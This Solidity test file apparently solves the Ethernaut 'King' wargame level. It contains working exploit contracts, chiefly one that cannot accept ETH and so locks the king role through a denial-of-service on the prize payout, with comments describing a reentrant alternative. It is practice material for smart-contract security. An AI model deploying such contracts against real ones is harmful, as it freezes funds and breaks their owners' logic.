// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/King.sol";
import "src/levels/KingFactory.sol";

contract TestKing is BaseTest {
    King private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new KingFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = King(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level._king(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // In this level Factory must not be the king of the King contract
        // 2 ways to solve this level:

        // 1. Create a contract with that can call King to become king, and then make its receive() function call King with ETH again.
        // It works because this contract is the king, then factory sends ETH to King, which causes King send ETH to its king, triggering our contracts receive().
        // It says Contract is out of gas, therefore Factorys call with ETH reverts. But why out of gas? Need to get back to it.

        // 2. Create a contract that has no way to accept ETH, causing receive() revert once this contract becomes the king.

        vm.startPrank(player, player);

        // // Method number 1
        // ExploitWithReceive exploit = new ExploitWithReceive{value: 0.001 ether}(payable(address(level)));
        // ExploitWithReceive.becomeKing();

        // Method number 2
        Exploit exploit = new Exploit();
        exploit.becomeKing{value: level.prize()}(payable(address(level)));

        vm.stopPrank();
    }
}

contract ExploitWithReceive {
    address payable public level;

    constructor(address payable _level) public payable {
        level = _level;
    }

    function becomeKing() public {
        level.call{value: 0.001 ether}("");
    }

    receive() external payable {
        becomeKing();
    }
}

contract Exploit {
    function becomeKing(address payable level) public payable {
        level.call{value: msg.value}("");
    }
}
